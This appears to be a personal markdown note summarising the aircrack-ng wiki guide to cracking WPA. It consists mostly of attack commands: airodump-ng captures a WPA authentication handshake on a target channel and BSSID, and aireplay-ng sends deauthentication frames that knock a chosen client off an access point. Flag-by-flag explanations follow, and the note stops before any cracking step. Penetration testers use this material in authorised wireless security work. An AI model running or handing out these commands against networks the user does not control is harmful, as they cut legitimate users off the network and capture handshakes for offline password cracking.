[Source](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)

1. Injection test
2. start airodump-ng to collect authentication handshake
```bash
sudo airodump-ng wlp0s20f0u1
```
3. Check channel of the BSSID that we want and restart airodump-ng on that channel
```bash
sudo airodump-ng wlp0s20f0u1 --channel 1
```
4. deauthenticate the wireless client
  - Open another console session and enter:
      ```bash
      # -a -> access point
      # -c -> client to deauth
      aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlp0s20f0u1
      ```

## Other

```bash
airodump-ng -c 11 --bssid 00:14:6C:7E:40:80 -w psk ath0
```
- -c 11 is the channel for the wireless network
- --bssid 00:14:6C:7E:40:80 is the access point MAC address. This eliminates extraneous traffic.
- -w psk is the file name prefix for the file which will contain the IVs.
- ath0 is the interface name.

```
aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
```
- -0 means deauthentication
- 1 is the number of deauths to send (you can send multiple if you wish)
- -a access point
- -c client to deauth
- ath0 is the interface name
